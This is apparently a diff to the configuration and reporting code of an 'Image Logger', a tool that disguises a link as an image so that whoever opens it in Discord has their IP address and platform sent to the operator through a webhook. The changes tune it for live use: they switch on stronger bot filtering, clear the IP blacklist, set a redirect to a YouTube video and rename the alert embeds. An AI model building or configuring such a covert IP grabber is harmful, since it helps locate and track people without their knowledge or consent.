@@ -40,7 +40,7 @@ config = {
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 1, # Prevents bots from triggering the alert
+    "antiBot": 4, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDR8bcRRN0Gj0&index=2" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = () # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
@@ -87,7 +87,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = True):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -99,7 +99,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "Image Logger",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Image Logger",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
